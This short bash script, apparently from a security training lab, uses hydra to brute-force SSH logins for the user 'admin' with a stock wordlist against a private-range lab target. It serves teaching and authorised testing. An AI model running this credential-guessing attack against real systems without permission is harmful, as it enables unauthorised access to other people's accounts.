#!/usr/bin/env bash
# ssh-bruteforce.sh — Controlled SSH brute-force test for Kali Linux in Lab 2.1 & Lab 6.1

TARGET="${1:-10.60.0.101}"
echo "[*] Executing controlled SSH login attempts against target: $TARGET"
hydra -l admin -P /usr/share/wordlists/fasttrack.txt "$TARGET" ssh -t 4 -V
